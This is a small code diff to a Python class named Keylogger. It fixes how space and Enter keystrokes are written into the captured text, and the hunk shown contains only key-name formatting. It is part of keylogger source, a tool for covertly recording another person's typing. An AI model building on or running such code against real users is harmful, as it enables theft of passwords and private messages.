@@ -29,7 +29,7 @@ class Keylogger:
             # uppercase with []
             if name == "space":
             # " " instead of "space"
-            name = ""
+                name = " "
         elif name == "enter":
             # add a new line whenever an ENTER is pressed
             name = "[ENTER]\n"
